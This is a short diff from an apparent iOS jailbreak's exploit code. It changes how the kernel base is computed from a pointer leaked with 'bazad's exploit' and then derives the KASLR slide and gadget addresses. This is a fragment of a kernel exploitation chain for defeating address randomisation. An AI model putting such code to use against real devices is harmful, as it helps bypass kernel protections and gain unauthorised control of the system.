@@ -80,7 +80,7 @@ int jailbreak()
   
   //Leak the kernelpointer from X18 using bazad's exploit
   uint64_t ptr_leak = x18_leak();
-  kernel_base = ptr_leak - 0x95000;
+  kernel_base = ptr_leak - (0xfffffff01a29925c - 0xfffffff01a204000);
   kaslr_shift = kernel_base - off_kernel_base;
   osdata_get_metaclass = off_osdata_metaclass + kaslr_shift;
   kernel_return = osdata_get_metaclass + 8 + kaslr_shift;
